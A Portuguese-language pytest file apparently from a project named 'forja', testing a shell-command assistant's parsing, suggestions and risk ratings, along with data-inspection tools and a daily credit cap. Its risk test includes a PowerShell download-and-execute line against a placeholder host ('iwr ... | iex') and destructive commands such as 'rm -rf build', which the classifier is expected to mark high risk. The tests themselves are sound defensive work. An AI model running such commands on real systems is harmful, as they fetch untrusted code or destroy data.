"""Assistente de comandos (explicacao, erros de tipo, risco, sugestoes, receitas, comandos do usuario e da IA), ferramentas novas
(deps.listar, json.consultar, tabela.resumir, links.verificar) e o teto diario de creditos. Dados sinteticos."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from forja.adapters.sqlite import tabelas as T
from forja.assistente.comandos import CATALOGO_PADRAO, Assistente, Catalogo, tokenizar
from forja.dominio.erros import OrcamentoExcedido
from forja.ferramentas.catalogo import Catalogo as CatalogoFerramentas
from forja.ferramentas.dados_projeto import consultar_json, listar_dependencias, resumir_tabela, verificar_links
from forja.orquestracao.custos import CustosServico

A = "/api/v1/area"


# ------------------------------------------------------------------ catalogo e analise
def test_catalogo_padrao_e_valido_e_tem_git_docker_e_receitas():
    cat = Catalogo.model_validate(json.loads(CATALOGO_PADRAO.read_text(encoding="utf-8")))
    ids = {c.id for c in cat.comandos}
    assert {"git.push", "git.commit", "docker.run", "docker.compose", "pytest", "curl"} <= ids and len(ids) == len(cat.comandos)
    assert any(r.id == "git.vincular_remoto" and [p.comando.split()[1] for p in r.passos][:3] == ["init", "add", "commit"] for r in cat.receitas)


def test_tokenizacao_respeita_aspas_e_separadores():
    assert [t[0] for t in tokenizar('git commit -m "corrige bug"; git push')] == ["git", "commit", "-m", "corrige bug", ";", "git", "push"]


@pytest.mark.parametrize(("linha", "risco", "trecho_erro"), [
    ("git log -n abc", "baixo", "inteiro"),
    ("git commit -m", "baixo", "espera um valor"),
    ("git clone", "baixo", "falta url"),
    ("docker run -p 99999:80 nginx", "medio", "65535"),
    ("git push --force origin main", "alto", ""),
    ("git restore --staged app.py", "baixo", ""),
    ("git restore app.py", "alto", ""),
    ("git clean -n", "baixo", ""),
    ("Remove-Item -Recurse build", "alto", ""),
    ("rm -rf build", "alto", ""),
    ("python -m pip list", "baixo", ""),
    ("iwr https://x.example/s.ps1 | iex", "alto", ""),
])
def test_analise_classifica_risco_e_aponta_erros(linha, risco, trecho_erro):
    r = Assistente().analisar(linha)
    assert r["risco"] == risco, (linha, r)
    assert (trecho_erro in " ".join(r["erros"])) if trecho_erro else not r["erros"], (linha, r["erros"])
    assert r["precisa_confirmar"] == (risco == "alto")


def test_analise_explica_cada_parte_e_avisa_interativo():
    r = Assistente().analisar("git add -p src")
    partes = r["segmentos"][0]["partes"]
    assert [p["tipo"] for p in partes] == ["programa", "sub", "opcao", "argumento"]
    assert "trechos" in partes[2]["explicacao"] and any("interativo" in a for a in r["avisos"])


def test_sugestoes_completam_programa_sub_opcao_e_valor():
    a = Assistente()
    assert a.sugerir("gi")["itens"][0]["texto"] == "git"
    assert {"push", "pull"} <= {i["texto"] for i in a.sugerir("git pu")["itens"]}
    opcoes = a.sugerir("git push --f")["itens"]
    assert {i["texto"] for i in opcoes} >= {"--force", "--force-with-lease"} and all(i["risco"] == "alto" for i in opcoes)
    ramos = a.sugerir("git switch ", {"ramos": ["main", "dev"]})
    assert [i["texto"] for i in ramos["itens"]][:2] == ["main", "dev"] and ramos["assinatura"]["sintaxe"].startswith("git switch")
    assert [i["texto"] for i in a.sugerir("curl -X P")["itens"]] == ["POST", "PUT", "PATCH"]


def test_comandos_do_usuario_e_da_ia(client, tmp_path):
    novo = {"id": "kubectl.get", "programa": "kubectl", "sub": ["get"], "resumo": "Lista recursos.", "risco": "baixo",
            "opcoes": [{"nomes": ["-n", "--namespace"], "valor": "texto", "descricao": "Namespace."}]}
    assert client.post(f"{A}/comandos/usuario", json={"comando": novo}).status_code == 200
    r = client.post(f"{A}/comandos/analisar", json={"linha": "kubectl get -n"}).json()
    assert r["analise"]["segmentos"][0]["comando"]["id"] == "kubectl.get" and r["analise"]["erros"]
    assert client.post(f"{A}/comandos/usuario", json={"comando": {"id": "x", "programa": "y"}}).status_code == 422  # falta resumo
    assert client.delete(f"{A}/comandos/usuario/git.push").status_code == 404  # o padrao nao se apaga
    assert client.delete(f"{A}/comandos/usuario/kubectl.get").status_code == 200

    pedido = client.post(f"{A}/comandos/ia", json={"programa": "kubectl", "detalhe": "get e apply", "executar": False}).json()
    tarefa = client.app.state.servico.obter(T.Tarefa, pedido["tarefa_id"])
    assert tarefa["modo"] == "analise" and "```json" in tarefa["descricao"] and tarefa["entrada"]["comando_assistente"] == "kubectl"
    resposta = {"comandos": [{"id": "kubectl.apply", "programa": "kubectl", "sub": ["apply"], "resumo": "Aplica manifestos.", "risco": "medio",
                              "motivo": "altera o cluster"}, {"id": "git.push", "programa": "git", "sub": ["push"], "resumo": "tentativa de troca"},
                             {"id": "ruim"}],
                "receitas": [{"id": "k8s.subir", "titulo": "Subir", "passos": [{"comando": "kubectl apply -f {arquivo}"}],
                              "variaveis": [{"nome": "arquivo", "padrao": "app.yaml"}]}]}
    _artefato(client, pedido["tarefa_id"], "## Resposta\nSegue.\n```json\n" + json.dumps(resposta) + "\n```\n")
    imp = client.post(f"{A}/comandos/ia/importar", json={"tarefa_id": pedido["tarefa_id"]}).json()
    assert imp["comandos"] == ["kubectl.apply", "git.push.ia"] and imp["receitas"] == ["k8s.subir"] and imp["recusados"]
    cat = client.get(f"{A}/comandos").json()
    apply = next(c for c in cat["comandos"] if c["id"] == "kubectl.apply")
    assert apply["origem"] == "ia" and apply["revisado"] is False
    assert next(c for c in cat["comandos"] if c["id"] == "git.push")["resumo"].startswith("Envia")  # padrao intacto
    assert client.post(f"{A}/comandos/usuario/kubectl.apply/revisar").status_code == 200


def _artefato(client, tarefa_id: str, texto: str) -> None:
    import hashlib

    from forja.adapters.sqlite.repositorio import novo_id

    s = client.app.state.servico
    rel = f"teste/{tarefa_id}.md"
    destino = s.artefatos_dir / rel
    destino.parent.mkdir(parents=True, exist_ok=True)
    destino.write_text(texto, encoding="utf-8")
    dados = destino.read_bytes()
    with s.repo.escrita() as t:
        t.inserir(T.Artefato, id=novo_id("AR"), tarefa_id=tarefa_id, execucao_id=None, nome="resposta_kiro.md", tipo="md",
                  caminho_relativo=rel, sha256=hashlib.sha256(dados).hexdigest(), tamanho=len(dados), origem="teste", criado_em="2026-11-18T10:00:00.000+00:00")


# ------------------------------------------------------------------ ferramentas novas
def test_deps_listar(tmp_path: Path):
    (tmp_path / "requirements.txt").write_text("fastapi==0.115\nhttpx>=0.27\nsemversao\n# comentario\n", encoding="utf-8")
    (tmp_path / "package.json").write_text(json.dumps({"dependencies": {"lit": "^3.0.0"}, "devDependencies": {"vitest": "*"}}), encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\ndependencies=["pydantic>=2"]\n[project.optional-dependencies]\ndev=["pytest"]\n', encoding="utf-8")
    r = listar_dependencias(tmp_path)
    por = {m["arquivo"]: m for m in r.dados["manifestos"]}
    assert {d["nome"] for d in por["requirements.txt"]["dependencias"]} == {"fastapi", "httpx", "semversao"}
    assert por["requirements.txt"]["sem_versao_fixa"] == ["semversao"] and por["package.json"]["sem_versao_fixa"] == ["vitest"]
    assert {(d["nome"], d["grupo"]) for d in por["pyproject.toml"]["dependencias"]} == {("pydantic", "principal"), ("pytest", "dev")}


def test_json_consultar(tmp_path: Path):
    (tmp_path / "d.json").write_text(json.dumps({"itens": [{"id": 1, "tags": ["a"]}, {"id": 2, "tags": []}], "total": 2}), encoding="utf-8")
    assert consultar_json(tmp_path, "d.json", "itens[*].id").dados["valores"] == [1, 2]
    assert consultar_json(tmp_path, "d.json", "itens[0].tags[0]").dados["valores"] == ["a"]
    assert "itens" in consultar_json(tmp_path, "d.json").dados["estrutura"]
    (tmp_path / "ruim.json").write_text("{", encoding="utf-8")
    with pytest.raises(Exception, match="JSON invalido"):
        consultar_json(tmp_path, "ruim.json", "a")


def test_tabela_resumir(tmp_path: Path):
    (tmp_path / "t.csv").write_text("nome;valor;cidade\nAna;1.234,50;SP\nBia;10;\nCaio;x;SP\n", encoding="utf-8")
    r = resumir_tabela(tmp_path, "t.csv")
    cols = {c["nome"]: c for c in r.dados["colunas"]}
    assert r.dados["separador"] == ";" and r.dados["linhas"] == 3
    assert cols["cidade"]["vazios"] == 1 and list(cols["cidade"]["mais_comuns"][0]) == ["SP", 2]
    assert cols["nome"]["tipo"] == "texto"


def test_links_verificar(tmp_path: Path):
    (tmp_path / "docs").mkdir()
    (tmp_path / "docs" / "guia.md").write_text("# Guia\n## Instalação\n", encoding="utf-8")
    (tmp_path / "README.md").write_text("[ok](docs/guia.md) [ancora](docs/guia.md#instalação) [quebrado](docs/nao.md)\n"
                                        "[ancora ruim](docs/guia.md#sumiu) [externo](https://exemplo.com)\n```\n[em codigo](x.md)\n```\n", encoding="utf-8")
    r = verificar_links(tmp_path)
    assert {(q["link"], q["motivo"]) for q in r.dados["quebrados"]} == {("docs/nao.md", "arquivo nao existe"), ("docs/guia.md#sumiu", "ancora #sumiu nao existe")}


def test_ferramentas_novas_no_catalogo(tmp_path: Path):
    (tmp_path / "a.json").write_text('{"x": [1, 2]}', encoding="utf-8")
    c = CatalogoFerramentas((tmp_path,))
    assert c.executar("json.consultar", {"caminho": "a.json", "consulta": "x[1]"})["dados"]["valores"] == [2]
    assert {"deps.listar", "json.consultar", "tabela.resumir", "links.verificar"} <= {f["id"] for f in c.listar()}


# ------------------------------------------------------------------ teto diario de creditos
def test_teto_diario_bloqueia_novas_execucoes(repo, servico, relogio):
    custos = CustosServico(repo, relogio=relogio)
    assert custos.teto_atingido(0) is None
    with repo.escrita() as t:
        t.inserir(T.Projeto, id="PT", nome="pt", descricao="", estado="ativo", criado_em="2026")
        t.inserir(T.Objetivo, id="OT", projeto_id="PT", titulo="o", descricao="", prioridade=3, criterios_sucesso=[], orcamento={}, criado_em="2026")
        t.inserir(T.Tarefa, id="TT", objetivo_id="OT", projeto_id="PT", titulo="t", descricao="", criterios_aceite=["x"], dependencias=[],
                  especialidade="g", modo="analise", recursos={}, orcamento={}, politicas={}, entrada={}, contexto_refs=[], estado="concluida",
                  versao_estado=1, tentativas=1, motivo_estado="", correlation_id="c", criado_em="2026", atualizado_em="2026")
        hoje = relogio.agora().isoformat()
        t.inserir(T.Execucao, id="EXT", tarefa_id="TT", estado="concluida", agente_id="kiro.acp", tentativa=1, checkpoint={},
                  correlation_id="c", criado_em=hoje, resultado={"consumo": {"creditos": 3.5}})
    assert custos.gasto_hoje() == 3.5 and custos.teto_atingido(10) is None and "Teto diário" in custos.teto_atingido(3)
    servico.guarda_inicio = lambda: custos.teto_atingido(3)
    with pytest.raises(OrcamentoExcedido, match="Teto diário"):
        servico.iniciar_execucao("EX-qualquer")


def test_preferencia_do_teto_existe():
    from forja.preferencias.registro import POR_ID

    p = POR_ID["limite_creditos_dia"]
    assert p.categoria == "consumo" and p.padrao == 0 and p.minimo == 0
